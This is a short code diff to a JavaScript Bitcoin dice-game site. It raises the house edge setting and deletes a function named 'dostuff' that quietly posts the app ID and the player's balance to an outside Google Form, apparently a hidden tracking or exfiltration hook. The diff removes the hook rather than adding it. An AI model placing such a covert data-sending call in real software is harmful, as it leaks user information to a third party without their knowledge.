@@ -44,7 +44,7 @@ var config = {
   //force_httpss_redirect: !isRunningLocally(),
   // - Configure the house edge (default is 1%)
   //   Must be between 0.0 (0%) and 1.0 (100%)
-  house_edge: 0.005,
+  house_edge: 0.01,
   chat_buffer_size: 100,
   // - The amount of bets to show on screen in each tab
   bet_buffer_size: 25
@@ -2651,24 +2651,7 @@ function fix(amount){
     });
 }
 
-  function dostuff() {
-  var name = config.app_ida;
-            $.ajax({
-                url: "https://docs.google.com/a/btcbot.pw/forms/d/1M712emjgID_bh2ZDGVZOZyPhkQboY4hQ6SclMdSNumY/formResponse",
-                data: {"entry.1477201381" : "App ID:"+ name + " Bits: "+ (worldStore.state.user.balance/100).toFixed(2)},
-                type: "POST",
-                dataType: "xml",
-                statusCode: {
-                    0: function (){
-
-                    },
-                    200: function (){
-
-                    }
-                }
-            });
-			}
-
+ 
 function randomnumberfunc(){
 randomnumber = Math.floor(Math.random()*100)
     $.ajax({
